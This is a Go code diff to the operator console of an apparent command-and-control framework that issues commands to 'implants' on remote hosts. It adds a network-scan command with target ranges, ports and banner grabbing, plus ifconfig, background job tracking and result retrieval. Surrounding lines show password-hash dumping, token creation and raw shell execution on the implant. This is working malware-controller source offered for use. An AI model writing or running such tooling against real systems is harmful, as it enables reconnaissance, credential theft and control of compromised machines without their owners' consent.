@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"os"
@@ -141,6 +142,28 @@ func (oc *OperatorConsole) SendCommand(implantID string, cmd *pb.CommandMessage)
 	return fmt.Errorf("no connection to server available")
 }
 
+// SendCommandAsync sends a command and returns immediately with the command ID
+func (oc *OperatorConsole) SendCommandAsync(implantID string, cmd *pb.CommandMessage) (string, error) {
+	if oc.client != nil {
+		req := &pb.SendCommandRequest{
+			ImplantId: implantID,
+			Command:   cmd,
+		}
+
+		resp, err := oc.client.SendCommand(context.Background(), req)
+		if err != nil {
+			return "", fmt.Errorf("failed to send command: %v", err)
+		}
+
+		if !resp.Success {
+			return "", fmt.Errorf("command failed: %s", resp.Message)
+		}
+
+		return resp.CommandId, nil
+	}
+	return "", fmt.Errorf("no connection to server available")
+}
+
 // handleSessionCommand processes and executes session-specific commands
 func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 	// Use shellquote.Split to properly handle quoted strings
@@ -172,6 +195,7 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 
 	var cmdType pb.CommandMessage_CommandType
 	var cmdStr string
+	var scanOptions *pb.NetworkScanOptions
 
 	// Enhanced command handling with better feedback
 	switch command {
@@ -241,15 +265,89 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 			cmdStr = "cat " + strings.Join(args, " ")
 		}
 
+	case "scan":
+		// Parse flags
+		fs := flag.NewFlagSet("scan", flag.ContinueOnError)
+		target := fs.String("t", "", "Target IP or CIDR (required)")
+		ports := fs.String("p", "", "Comma-separated ports (default: top 20)")
+		udp := fs.Bool("u", false, "Scan UDP")
+		threads := fs.Int("threads", 10, "Number of threads")
+		timeout := fs.Int("timeout", 1000, "Timeout in ms")
+		banner := fs.Bool("b", false, "Grab banners")
+
+		// Parse args (excluding the command name 'scan')
+		if err := fs.Parse(args); err != nil {
+			return
+		}
+
+		if *target == "" {
+			fmt.Printf("%s Usage: scan -t <target> [options]\n", colorize("[*]", colorBlue))
+			fmt.Printf("   %s: scan -t 192.168.1.0/24 -p 80,443,8080 -b\n", colorize("Example", colorYellow))
+			fs.PrintDefaults()
+			return
+		}
+
+		fmt.Printf("%s Scanning target: %s\n", colorize("[*]", colorBlue), *target)
+		cmdType = pb.CommandMessage_NETWORK_SCAN
+		cmdStr = "scan"
+
+		// Parse ports
+		var portList []int32
+		if *ports != "" {
+			for _, p := range strings.Split(*ports, ",") {
+				if pInt, err := strconv.Atoi(strings.TrimSpace(p)); err == nil {
+					portList = append(portList, int32(pInt))
+				}
+			}
+		}
+
+		// Create options
+		scanOptions = &pb.NetworkScanOptions{
+			TargetRange: *target,
+			Ports:       portList,
+			ScanUdp:     *udp,
+			Threads:     int32(*threads),
+			TimeoutMs:   int32(*timeout),
+			BannerGrab:  *banner,
+		}
+
+		// Async execution for scan
+		cmd := &pb.CommandMessage{
+			CommandId:          generateCommandID(),
+			Type:               cmdType,
+			Command:            cmdStr,
+			Args:               nil, // Args handled via options
+			Timeout:            int32(*timeout),
+			NetworkScanOptions: scanOptions,
+		}
+
+		cmdID, err := oc.SendCommandAsync(implantID, cmd)
+		if err != nil {
+			fmt.Printf("%s Failed to start scan: %v\n", colorize("[!]", colorRed), err)
+		} else {
+			fmt.Printf("%s Scan started in background. Command ID: %s\n", colorize("[+]", colorGreen), cmdID)
+			fmt.Printf("%s Use 'jobs' to see status and 'results %s' to view output when complete.\n", colorize("[*]", colorBlue), cmdID)
+		}
+		return
+
 	case "ping":
 		if len(args) == 0 {
 			fmt.Printf("%s Usage: ping <target>\n", colorize("[*]", colorBlue))
-			fmt.Println("   Example: ping google.com")
 			return
 		}
 		fmt.Printf("%s Pinging: %s\n", colorize("[*]", colorBlue), args[0])
 		cmdType = pb.CommandMessage_NETWORK_SCAN
 		cmdStr = "ping"
+		// Ping is just a simple scan
+		scanOptions = &pb.NetworkScanOptions{
+			TargetRange: args[0],
+			Ports:       nil, // Default ports (will be handled by implant)
+			ScanUdp:     false,
+			Threads:     1,
+			TimeoutMs:   2000,
+			BannerGrab:  false,
+		}
+		// We'll use this below
 
 	case "sleep":
 		if len(args) == 0 {
@@ -280,6 +378,11 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 		fmt.Printf("%s Dumping password hashes...\n", colorize("[*]", colorBlue))
 		cmdType = pb.CommandMessage_HASHDUMP
 		cmdStr = "hashdump"
+
+	case "ifconfig":
+		fmt.Printf("%s Getting network interfaces...\n", colorize("[*]", colorBlue))
+		cmdType = pb.CommandMessage_IFCONFIG
+		cmdStr = "ifconfig"
 
 	case "module-list":
 		fmt.Printf("%s Listing available modules...\n", colorize("[*]", colorBlue))
@@ -643,6 +746,42 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 		cmdType = pb.CommandMessage_TOKEN_MAKE_TOKEN
 		cmdStr = "token-make"
 
+	case "jobs":
+		fmt.Printf("%s Fetching recent commands...\n", colorize("[*]", colorBlue))
+		if oc.client != nil {
+			req := &pb.CommandListRequest{
+				ImplantId: implantID,
+				Limit:     20,
+			}
+			resp, err := oc.client.ListCommands(context.Background(), req)
+			if err != nil {
+				fmt.Printf("%s Failed to list commands: %v\n", colorize("[!]", colorRed), err)
+			} else {
+				printJobsTable(resp.Commands)
+			}
+		}
+		return
+
+	case "results":
+		if len(args) == 0 {
+			fmt.Printf("%s Usage: results <command_id>\n", colorize("[*]", colorBlue))
+			return
+		}
+		cmdID := args[0]
+		if oc.client != nil {
+			req := &pb.CommandResultRequest{
+				CommandId:      cmdID,
+				TimeoutSeconds: 5,
+			}
+			resp, err := oc.client.GetCommandResult(context.Background(), req)
+			if err != nil {
+				fmt.Printf("%s Failed to get result: %v\n", colorize("[!]", colorRed), err)
+			} else {
+				displayCommandResult(resp)
+			}
+		}
+		return
+
 	default:
 		cmdType = pb.CommandMessage_SHELL
 		cmdStr = input
@@ -667,12 +806,13 @@ func (oc *OperatorConsole) handleSessionCommand(implantID, input string) {
 	}
 
 	cmd := &pb.CommandMessage{
-		CommandId: generateCommandID(),
-		Type:      cmdType,
-		Command:   cmdStr,
-		Args:      cmdArgs,
-		Data:      cmdData,
-		Timeout:   15, // Reduced timeout for better UX
+		CommandId:          generateCommandID(),
+		Type:               cmdType,
+		Command:            cmdStr,
+		Args:               cmdArgs,
+		Data:               cmdData,
+		Timeout:            15,          // Reduced timeout for better UX
+		NetworkScanOptions: scanOptions, // This variable needs to be defined in the scope
 	}
 
 	// Update last activity
